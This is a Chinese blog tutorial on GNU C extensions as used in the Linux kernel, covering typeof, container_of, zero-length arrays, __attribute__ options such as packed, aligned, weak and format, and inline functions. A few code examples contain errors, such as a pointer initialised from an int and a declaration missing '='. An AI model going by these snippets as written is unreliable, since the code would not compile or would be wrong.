<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x, y) (&#123;     \</span></span><br><span class="line"><span class="meta">	typeof(x) _x = (x); \</span></span><br><span class="line"><span class="meta">	typeof(y) _y = (y); \</span></span><br><span class="line"><span class="meta">	(void) (&amp;_x == &amp;_y); \</span></span><br><span class="line"><span class="meta">	_x &gt; _y ? _x : _y;&#125;)</span></span><br></pre></td></tr></table></figure></div>

<p>比较难理解的是<code>(void)(&amp;x==&amp;y);</code>这句话，看起来很多余，仔细分析一下，你会发现这条语句很有意思。它的作用有两个：一是用来给用户提示一个警告，对于不同类型的指针比较，编译器会发出一个警告，提示两种数据的类型不同。二是两个数进行比较运算，运算的结果却没有用到，有些编译器可能会给出一个warning，加一个（void）后，就可以消除这个警告。</p>
<hr>
<h3 id="typeof与container-of宏"><a href="#typeof与container-of宏" class="headerlink" title="typeof与container_of宏"></a>typeof与container_of宏</h3><p><a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.7/source/drivers/gpu/drm/radeon/mkregtable.c#L28" >内核中的定义<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<hr>
<p><strong>typeof</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typeof (<span class="type">int</span>*) y <span class="comment">// int *y;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> z = <span class="number">4</span>;</span><br><span class="line"><span class="type">int</span> *x = z;</span><br><span class="line">typeof (*x) y  <span class="comment">// int y;</span></span><br><span class="line">    </span><br><span class="line">typeof(typeof(<span class="type">char</span>*)[<span class="number">4</span>]) y <span class="comment">//char *y[4]</span></span><br></pre></td></tr></table></figure></div>

<p>GNU C扩展了一个关键字<code>typeof</code>，用来获取一个变量或表达式的类型。这里使用关键字可能不太合适，因为毕竟typeof现在还没有被纳入C标准，是GCC扩展的一个关键字。为了表述方便，我们就姑且把它叫作关键字吧。使用<code>typeof</code>可以获取一个变量或表达式的类型。typeof的参数有两种形式：表达式或类型。</p>
<hr>
<p><strong>container_of</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stddef.h&gt;</span> <span class="comment">//这个库包含了offsetof的定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> offsetof</span></span><br><span class="line"><span class="comment">// 获取结构体成员偏移，因为常量指针的值为0，即可以看作结构体首地址为0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offsetof(TYPE,MEMBER)((size_t)&amp;((TYPE *)0)-&gt;MEMBER)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*ptr 成员指针</span></span><br><span class="line"><span class="comment">* type 结构体 比如struct Stu</span></span><br><span class="line"><span class="comment">* member 成员变量，跟指针对应</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="comment">// 最后一句的意义就是，取结构体某个成员member的地址，减去这个成员在结构体type中的偏移，运算结果就是结构体type的首地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> container_of(ptr, type, member) (&#123;          \</span></span><br><span class="line"><span class="meta">        const typeof( ((type *)0)-&gt;member ) *__mptr = (const typeof( ((type *)0)-&gt;member ) *)(ptr); \</span></span><br><span class="line"><span class="meta">        (type *)( (char *)__mptr - offsetof(type,member) );&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> num;</span><br><span class="line">	<span class="type">int</span> id;</span><br><span class="line">	<span class="type">int</span> score;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span> =</span>  &#123;</span><br><span class="line">		.num = <span class="number">1</span>,</span><br><span class="line">		.id = <span class="number">12345</span>,</span><br><span class="line">		.score = <span class="number">90</span>,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p %p %p\n&quot;</span>, &amp;stu.id, &amp;stu, container_of(&amp;stu.id, <span class="keyword">struct</span> student, id));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个宏在Linux内核中应用甚广，会不会用这个宏，看不看得懂这个宏，也逐渐成为考察一个内核驱动开发者的C语言功底的不成文标准。它的主要作用就是，根据结构体某一成员的地址，获取这个结构体的首地址。</p>
<hr>
<h3 id="零长数组"><a href="#零长数组" class="headerlink" title="零长数组"></a>零长数组</h3><hr>
<p><strong>Linux kernel 中的零长数组</strong></p>
<p>零长度数组不占用内存存储空间。零长度数组一般单独使用的机会很少，它常常作为结构体的一个成员，构成一个变长结构体。在网卡驱动中，大家可能都比较熟悉一个名字：套接字缓冲区，即<code>Socket Buffer</code>，用来传输网络数据包。同样，在USB驱动中，也有一个类似的东西，叫作URB，其全名为<code>USB Request Block</code>，即USB请求块，用来传输USB数据包。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">urb</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">/* private: usb core and host controller only fields in the urb */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span>		<span class="comment">/* reference count of the URB */</span></span><br><span class="line">	<span class="type">int</span> unlinked;			<span class="comment">/* unlink error code */</span></span><br><span class="line">	<span class="type">void</span> *hcpriv;			<span class="comment">/* private data for host controller */</span></span><br><span class="line">	<span class="type">atomic_t</span> use_count;		<span class="comment">/* concurrent submissions counter */</span></span><br><span class="line">	<span class="type">atomic_t</span> reject;		<span class="comment">/* submissions will fail */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* public: documented fields in the urb that can be used by drivers */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">urb_list</span>;</span>	<span class="comment">/* list head for use by the urb&#x27;s</span></span><br><span class="line"><span class="comment">					 * current owner */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anchor_list</span>;</span>	<span class="comment">/* the URB may be anchored */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">usb_anchor</span> *<span class="title">anchor</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">usb_device</span> *<span class="title">dev</span>;</span>		<span class="comment">/* (in) pointer to associated device */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">usb_host_endpoint</span> *<span class="title">ep</span>;</span>	<span class="comment">/* (internal) pointer to endpoint */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> pipe;		<span class="comment">/* (in) pipe information */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> stream_id;		<span class="comment">/* (in) stream ID */</span></span><br><span class="line">	<span class="type">int</span> status;			<span class="comment">/* (return) non-ISO status */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> transfer_flags;	<span class="comment">/* (in) URB_SHORT_NOT_OK | ...*/</span></span><br><span class="line">	<span class="type">void</span> *transfer_buffer;		<span class="comment">/* (in) associated data buffer */</span></span><br><span class="line">	<span class="type">dma_addr_t</span> transfer_dma;	<span class="comment">/* (in) dma addr for transfer_buffer */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> *<span class="title">sg</span>;</span>		<span class="comment">/* (in) scatter gather buffer list */</span></span><br><span class="line">	<span class="type">int</span> num_mapped_sgs;		<span class="comment">/* (internal) mapped sg entries */</span></span><br><span class="line">	<span class="type">int</span> num_sgs;			<span class="comment">/* (in) number of entries in the sg list */</span></span><br><span class="line">	u32 transfer_buffer_length;	<span class="comment">/* (in) data buffer length */</span></span><br><span class="line">	u32 actual_length;		<span class="comment">/* (return) actual transfer length */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *setup_packet;	<span class="comment">/* (in) setup packet (control only) */</span></span><br><span class="line">	<span class="type">dma_addr_t</span> setup_dma;		<span class="comment">/* (in) dma addr for setup_packet */</span></span><br><span class="line">	<span class="type">int</span> start_frame;		<span class="comment">/* (modify) start frame (ISO) */</span></span><br><span class="line">	<span class="type">int</span> number_of_packets;		<span class="comment">/* (in) number of ISO packets */</span></span><br><span class="line">	<span class="type">int</span> interval;			<span class="comment">/* (modify) transfer interval</span></span><br><span class="line"><span class="comment">					 * (INT/ISO) */</span></span><br><span class="line">	<span class="type">int</span> error_count;		<span class="comment">/* (return) number of ISO errors */</span></span><br><span class="line">	<span class="type">void</span> *context;			<span class="comment">/* (in) context for completion */</span></span><br><span class="line">	<span class="type">usb_complete_t</span> complete;	<span class="comment">/* (in) completion routine */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">usb_iso_packet_descriptor</span> <span class="title">iso_frame_desc</span>[0];</span></span><br><span class="line">					<span class="comment">/* (in) ISO ONLY */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>在URB结构体的最后定义一个零长度数组，主要用于USB的同步传输。USB有4种传输模式：中断传输、控制传输、批量传输和同步传输。不同的USB设备对传输速度、传输数据安全性的要求不同，所采用的传输模式也不同。USB摄像头对视频或图像的传输实时性要求较高，对数据的丢帧不是很在意，丢一帧无所谓，接着往下传就可以了。所以USB摄像头采用的是USB同步传输模式。USB摄像头一般会支持多种分辨率，从16*16到高清720P多种格式。不同分辨率的视频传输，一帧图像数据的大小是不一样的，对USB传输数据包的大小和个数需求是不一样的。那么USB到底该如何设计，才能在不影响USB其他传输模式的前提下，适配这种不同大小的数据传输需求呢？答案就在结构体内的这个零长度数组上。</p>
<p>当用户设置不同分辨率的视频格式时，USB就使用不同大小和个数的数据包来传输一帧视频数据。通过零长度数组构成的这个变长结构体就可以满足这个要求。USB驱动可以根据一帧图像数据的大小，灵活地申请内存空间，以满足不同大小的数据传输。而且这个零长度数组又不占用结构体的存储空间。当USB使用其他模式传输时，不受任何影响，完全可以当这个零长度数组不存在。</p>
<hr>
<p><strong>指针和零长数组</strong></p>
<p>数组名和指针并不是一回事，数组名虽然在作为函数参数时，可以当作一个地址使用，但是两者不能画等号。变长结构体为什么不用指针？，原因很简单。如果使用指针，指针本身占用存储空间不说，根据上面的USB驱动的案例分析，你会发现，它远远没有零长度数组用得巧妙：零长度数组不会对结构体定义造成冗余，而且使用起来很方便。</p>
<h3 id="属性声明"><a href="#属性声明" class="headerlink" title="属性声明"></a>属性声明</h3><hr>
<p><strong><code>__attribute__</code></strong></p>
<p>GNU C增加了一个<code>__attribute__</code>关键字用来声明一个函数、变量或类型的特殊属性。声明这个特殊属性有什么用呢？主要用途就是指导编译器在编译程序时进行特定方面的优化或代码检查。例如，我们可以通过属性声明来指定某个变量的数据对齐方式。<code>__attribute__</code>的使用非常简单，当我们定义一个函数、变量或类型时，直接在它们名字旁边添加下面的属性声明即可。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((attribute))</span><br></pre></td></tr></table></figure></div>

<p>需要注意的是，<code>__attribute__</code>后面是两对小括号，不能图方便只写一对，否则编译就会报错。括号里面的ATTRIBUTE表示要声明的属性。目前<code>__attribute__</code>支持十几种属性声明。</p>
<table>
<thead>
<tr>
<th>函数属性(Function Attribute)</th>
<th>类型属性(Type Attributes)</th>
<th>变量属性(Variable Attribute)</th>
<th>Clang特有的</th>
</tr>
</thead>
<tbody><tr>
<td>noreturn</td>
<td>aligned</td>
<td>alias</td>
<td>availability</td>
</tr>
<tr>
<td>noinline</td>
<td>packed</td>
<td>at(address)</td>
<td>overloadable</td>
</tr>
<tr>
<td>always_inline</td>
<td>bitband</td>
<td>aligned</td>
<td></td>
</tr>
<tr>
<td>flatten</td>
<td></td>
<td>deprecated</td>
<td></td>
</tr>
<tr>
<td>pure</td>
<td></td>
<td>noinline</td>
<td></td>
</tr>
<tr>
<td>const</td>
<td></td>
<td>packed</td>
<td></td>
</tr>
<tr>
<td>constructor</td>
<td></td>
<td>weak</td>
<td></td>
</tr>
<tr>
<td>destructor</td>
<td></td>
<td>weakref(“target”)</td>
<td></td>
</tr>
<tr>
<td>sentinel</td>
<td></td>
<td>section(“name”)</td>
<td></td>
</tr>
<tr>
<td>format</td>
<td></td>
<td>unused</td>
<td></td>
</tr>
<tr>
<td>format_arg</td>
<td></td>
<td>used</td>
<td></td>
</tr>
<tr>
<td>section</td>
<td></td>
<td>visibility(“visibility_type”)</td>
<td></td>
</tr>
<tr>
<td>used</td>
<td></td>
<td>zero_init</td>
<td></td>
</tr>
<tr>
<td>unused</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>deprecated</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>weak</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>malloc</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>alias</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>warn_unused_result</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>nonnull</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>nothrow (不抛出C++ 异常)</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>常用如下：</strong></p>
<ol>
<li>aligned(n)：指定变量的对齐方式，n表示对齐字节数。</li>
<li>packed：指定结构体或联合体的成员按照1字节对齐。</li>
<li>section(“name”)：指定变量或函数所在的段名。</li>
<li>unused：告诉编译器该变量或函数未被使用，避免编译器产生警告。</li>
<li>deprecated：告诉编译器该变量或函数已经过时，避免编译器产生警告。</li>
<li>noreturn：告诉编译器该函数不会返回，避免编译器产生警告。</li>
<li>format：指定函数的参数格式，用于检查printf和scanf等函数的参数类型。</li>
<li>constructor：指定函数为构造函数，在程序启动时自动执行。</li>
<li>destructor：指定函数为析构函数，在程序结束时自动执行。</li>
<li>regparm(n)：属性用于以指定寄存器传递参数的个数，该属性只能用在函数定义和声明里，寄存器参数的上限值为3（使用顺序为EAX、EDX、ECX）。如果函数的参数个数超过3，那么剩余参数将使用内存传递方式。值得注意的一点是，regparm属性只在x86处理器体系结构下有效，而在x64体系结构下，GUN C语言使用寄存器传参方式作为函数的默认调用约定。无论是否采用regparm属性加以修饰，函数都会使用寄存器来传递参数，即使参数个数超过3，依然使用寄存器来传递参数</li>
</ol>
<hr>
<p><strong>section</strong></p>
<p>section属性的主要作用是：在程序编译时，将一个函数或变量放到指定的段，即放到指定的section中。一个可执行文件主要由代码段、数据段、BSS段构成。代码段主要存放编译生成的可执行指令代码，数据段和BSS段用来存放全局变量、未初始化的全局变量。代码段、数据段和BSS段构成了一个可执行文件的主要部分。除了这三个段，可执行文件中还包含其他一些段。用编译器的专业术语讲，还包含其他一些section，如只读数据段、符号表等。我们可以使用<code>__attribute__</code>来声明一个section属性，显式指定一个函数或变量，在编译时放到指定的section里面。通过上面的程序我们知道，未初始化的全局变量默认是放在.bss section中的，即默认放在BSS段中。现在我们就可以通过section属性声明，把这个未初始化的全局变量放到数据段.data中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> global_val <span class="number">8</span>;</span><br><span class="line"><span class="type">int</span> uninit_val __attribute__((section(<span class="string">&quot;.data&quot;</span>)));</span><br></pre></td></tr></table></figure></div>

<hr>
<p><strong>aligned</strong></p>
<p>GNU C通过<code>__attribute__</code>来声明aligned和packed属性，指定一个变量或类型的对齐方式。这两个属性用来告诉编译器：在给变量分配存储空间时，要按指定的地址对齐方式给变量分配地址。通过aligned属性声明，虽然可以显式地指定变量的地址对齐方式，但是也会因边界对齐造成一定的内存空洞，浪费内存资源。</p>
<p>我们通过这个属性声明，其实只是建议编译器按照这种大小地址对齐，但不能超过编译器允许的最大值。一个编译器，对每个基本数据类型都有默认的最大边界对齐字节数。如果超过了，则编译器只能按照它规定的最大对齐字节数来给变量分配地址。</p>
<p><strong>packed</strong></p>
<p>aligned属性一般用来增大变量的地址对齐，元素之间因为地址对齐会造成一定的内存空洞。而packed属性则与之相反，一般用来减少地址对齐，指定变量或类型使用最可能小的地址对齐方式。</p>
<p>这个特性在底层驱动开发中还是非常有用的。例如，你想定义一个结构体，封装一个IP控制器的各种寄存器，在ARM芯片中，每一个控制器的寄存器地址空间一般都是连续存在的。如果考虑数据对齐，则结构体内就可能有空洞，就和实际连续的寄存器地址不一致。使用packed可以避免这个问题，结构体的每个成员都紧挨着，依次分配存储地址，这样就避免了各个成员因地址对齐而造成的内存空洞。</p>
<p>我们也可以对整个结构体添加packed属性，这和分别对每个成员添加packed属性效果是一样的。修改结构体后，重新编译程序，运行结果和上面程序的运行结果相同：结构体的大小为7，结构体内各成员地址相同。</p>
<p><strong>内核中的packed和aligned</strong></p>
<p>在Linux内核源码中，我们经常看到aligned和packed一起使用，即对一个变量或类型同时使用aligned和packed属性声明。这样做的好处是：既避免了结构体内各成员因地址对齐产生内存空洞，又指定了整个结构体的对齐方式。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> a;</span><br><span class="line">    <span class="type">short</span> b;</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line">&#125;__attribute__((packed,aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data</span> <span class="title">s</span>;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size:%d\n&quot;</span>,<span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;s.a:%p\n&quot;</span>,&amp;s.a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;s.b:%p\n&quot;</span>,&amp;s.b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;s.c:%p\n&quot;</span>,&amp;s.c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line">size:<span class="number">8</span></span><br><span class="line">&amp;s.a:<span class="number">0028F</span>F30</span><br><span class="line">&amp;s.b:<span class="number">0028F</span>F31</span><br><span class="line">&amp;s.C:<span class="number">0028F</span>F33</span><br></pre></td></tr></table></figure></div>

<p>在上面的程序中，结构体data虽然使用了packed属性声明，结构体内所有成员所占的存储空间为7字节，但是我们同时使用了aligned(8)指定结构体按8字节地址对齐，所以编译器要在结构体后面填充1字节，这样整个结构体的大小就变为8字节，按8字节地址对齐。</p>
<p><strong>format</strong></p>
<p>GNU通过<code>__attribute__</code>扩展的<code>format</code>属性，来指定变参函数的参数格式检查。它的使用方法如下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220112233881.png"
                      alt="image-20250220112233881"
                ></p>
<p>我们定义一个LOG()变参函数，用来实现日志打印功能。编译器在编译程序时，如何检查LOG()函数的参数格式是否正确呢？方法其实很简单，通过给LOG()函数添加<code>__attribute__（（format(printf，1，2)））</code>属性声明就可以了。这个属性声明告诉编译器：你怎么对<code>printf()</code>函数进行参数格式检查的，就按照同样的方法，对<code>LOG()</code>函数进行检查。</p>
<p>属性format(printf，1，2)有3个参数，第1个参数printf是告诉编译器，按照printf()函数的标准来检查；第2个参数表示在LOG()函数所有的参数列表中格式字符串的位置索引；第3个参数是告诉编译器要检查的参数的起始位置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220113446445.png"
                      alt="image-20250220113446445"
                ></p>
<p><strong>变参函数</strong></p>
<p>对于变参函数，编译器或操作系统一般会提供一些宏给程序员使用，用来解析函数的参数列表，这样程序员就不用自己解析了，直接调用封装好的宏即可获取参数列表。编译器提供的宏有以下3种。</p>
<ul>
<li><code>va_list</code>：定义在编译器头文件stdarg.h中，如 <code>typedef char *va_list</code>；。</li>
<li><code>va_start(fmt，args)</code>：根据参数args的地址，获取args后面参数的地址，并保存在fmt指针变量中。</li>
<li><code> va_end(args)</code>：释放args指针，将其赋值为NULL。</li>
</ul>
<p>有了这些宏，我们的工作就简化了很多，就不用从零开始造轮子了。我们使用编译器提供的三个宏，省去了解析参数的麻烦。但打印的时候，使用<code>vprintf()</code>函数完成打印功能。<code>vprintf()</code>函数的声明在<code>stdio.h</code>头文件中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220114253555.png"
                      alt="image-20250220114253555"
                ></p>
<p>我们需要对函数添加<code>format</code>属性声明，让编译器在编译时，像检查<code>printf()</code>一样，检查<code>my_printf()</code>函数的参数格式。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220114356098.png"
                      alt="image-20250220114356098"
                ></p>
<p><strong>weak</strong></p>
<p>GNU C通过<code>weak</code>属性声明，可以将一个强符号转换为弱符号。使用方法如下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220112327181.png"
                      alt="image-20250220112327181"
                ></p>
<p>在一个程序中，无论是变量名，还是函数名，在编译器的眼里，就是一个符号而已。符号可以分为强符号和弱符号。</p>
<ul>
<li>强符号：函数名，初始化的全局变量名。</li>
<li>弱符号：未初始化的全局变量名。</li>
</ul>
<p>在一个工程项目中，对于相同的全局变量名、函数名，我们一般可以归结为下面3种场景。</p>
<ul>
<li>强符号+强符号。</li>
<li>强符号+弱符号。</li>
<li>弱符号+弱符号。</li>
</ul>
<p>强符号和弱符号主要用来解决在程序链接过程中，出现多个同名全局变量、同名函数的冲突问题。一般我们遵循下面3个规则。</p>
<ul>
<li><p>一山不容二虎。</p>
</li>
<li><p>强弱可以共处。</p>
</li>
<li><p>体积大者胜出。</p>
</li>
</ul>
<p>在一个项目中，不能同时存在两个强符号。如果你在一个多文件的工程中定义两个同名的函数或全局变量，那么链接器在链接时就会报重定义错误。但是在一个工程中允许强符号和弱符号同时存在，如你可以同时定义一个初始化的全局变量和一个未初始化的全局变量，这种写法在编译时是可以编译通过的。编译器对于这种同名符号冲突，在做符号决议时，一般会选用强符号，丢掉弱符号。还有一种情况就是，在一个工程中，当同名的符号都是弱符号时，那么编译器该选择哪个呢？谁的体积大，即谁在内存中的存储空间大，就选谁。</p>
<p>弱符号的这个特性，在库函数中应用得很广泛。如你在开发一个库时，基础功能已经实现，有些高级功能还没实现，那么你可以将这些函数通过weak属性声明转换为一个弱符号。通过这样设置，即使还没有定义函数，我们在应用程序中只要在调用之前做一个非零的判断就可以了，并不影响程序的正常运行。等以后发布新的库版本，实现了这些高级功能，应用程序也不需要进行任何修改，直接运行就可以调用这些高级功能。</p>
<p><strong>alias</strong></p>
<p>GNU C扩展了一个<code>alias</code>属性，这个属性很简单，主要用来给函数定义一个别名。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220113130101.png"
                      alt="image-20250220113130101"
                ></p>
<p>在Linux内核中，你会发现alias有时会和weak属性一起使用。如有些函数随着内核版本升级，函数接口发生了变化，我们可以通过alias属性对这个旧的接口名字进行封装，重新起一个接口名字。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220113221756.png"
                      alt="image-20250220113221756"
                ></p>
<h3 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h3><p>我们接着介绍与内联函数相关的两个属性：<code>noinline</code>和<code>always_inline</code>。这两个属性的用途是告诉编译器，在编译时，对我们指定的函数内联展开或不展开。其使用方法如下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220114533148.png"
                      alt="image-20250220114533148"
                ></p>
<p>一个使用inline声明的函数被称为内联函数，内联函数一般前面会有static和extern修饰。使用inline声明一个内联函数，和使用关键字register声明一个寄存器变量一样，只是建议编译器在编译时内联展开。使用关键字register修饰一个变量，只是建议编译器在为变量分配存储空间时，将这个变量放到寄存器里，这会使程序的运行效率更高。那么编译器会不会放呢？这得视具体情况而定，编译器要根据寄存器资源是否紧张、这个变量的类型及是否频繁使用来做权衡。</p>
<p>同样，当一个函数使用<code>inline</code>关键字修饰时，编译器在编译时一定会内联展开吗？也不一定。编译器也会根据实际情况，如函数体大小、函数体内是否有循环结构、是否有指针、是否有递归、函数调用是否频繁来做决定。如GCC编译器，一般是不会对函数做内联展开的，只有当编译优化等级开到<code>-O2</code>以上时，才会考虑是否内联展开。但是在我们使用noinline和always_inline对一个内联函数作显式属性声明后，编译器的编译行为就变得确定了：使用noinline声明，就是告诉编译器不要展开；使用always_inline属性声明，就是告诉编译器要内联展开。</p>
<p>内联函数和宏的功能差不多，那么为什么不直接定义一个宏，而去定义一个内联函数呢？与宏相比，内联函数有以下优势。</p>
<ul>
<li>参数类型检查：内联函数虽然具有宏的展开特性，但其本质仍是函数，在编译过程中，编译器仍可以对其进行参数检查，而宏不具备这个功能。</li>
<li>便于调试：函数支持的调试功能有断点、单步等，内联函数同样支持。</li>
<li>返回值：内联函数有返回值，返回一个结果给调用者。这个优势是相对于ANSI C说的，因为现在宏也可以有返回值和类型了，如前面使用语句表达式定义的宏。</li>
<li>接口封装：有些内联函数可以用来封装一个接口，而宏不具备这个特性。</li>
</ul>
<p>在Linux内核中，你会看到大量的内联函数被定义在头文件中，而且常常使用static修饰。为什么inline函数经常使用static修饰呢？从C语言到C++，甚至有人还拿出了Linux内核作者Linus关于static inline的解释。</p>
